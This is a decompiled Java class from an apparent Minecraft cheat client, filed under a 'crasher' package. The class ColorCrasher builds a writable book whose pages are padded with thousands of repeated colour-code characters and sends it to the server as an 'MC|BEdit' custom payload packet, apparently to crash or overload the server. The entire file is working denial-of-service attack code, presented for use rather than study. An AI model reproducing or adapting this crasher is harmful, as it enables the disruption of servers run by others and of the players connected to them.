// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;

public class ColorCrasher
{
    public static void start() {
        final Minecraft mc = Minecraft.getMinecraft();
        final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
        final ItemStack item = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagCompound nbt = new NBTTagCompound();
        final NBTTagList pages = new NBTTagList();
        final NBTTagString page = new NBTTagString("a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a§0a");
        for (int i = 0; i < 2; ++i) {
            pages.appendTag(page);
        }
        nbt.setTag("pages", pages);
        nbt.setTag("author", new NBTTagString("MEDDL"));
        nbt.setTag("title", new NBTTagString("LEUDE"));
        buffer.writeItemStackToBuffer(item);
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload("MC|BEdit", buffer));
    }
}
